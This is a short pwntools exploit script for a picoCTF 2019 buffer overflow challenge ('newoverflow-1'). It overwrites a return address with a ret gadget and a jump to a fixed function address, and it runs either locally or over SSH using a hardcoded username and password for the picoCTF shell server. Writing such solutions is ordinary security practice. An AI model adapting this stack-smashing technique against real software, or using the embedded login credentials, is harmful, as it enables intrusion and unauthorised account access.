from pwn import *
import sys

offset = 72
ret = 0x4005de

if sys.argv[1] == "r":
    shell = ssh("mitsu", "2019shell1.picoctf.com", password="hachimitsuki1119")
    shell = shell.run("sh")
    shell.sendline("cd /problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4")
    shell.sendline("pwd")
    print(shell.recvline(0x100, timeout=3))
    shell.sendline("./vuln")
else:
    shell = process("./vuln")

payload = b"A" * offset
payload += p64(ret)
payload += p64(0x400767)
shell.sendline(payload)

print(shell.recv(0x100, timeout=10))

shell.interactive()

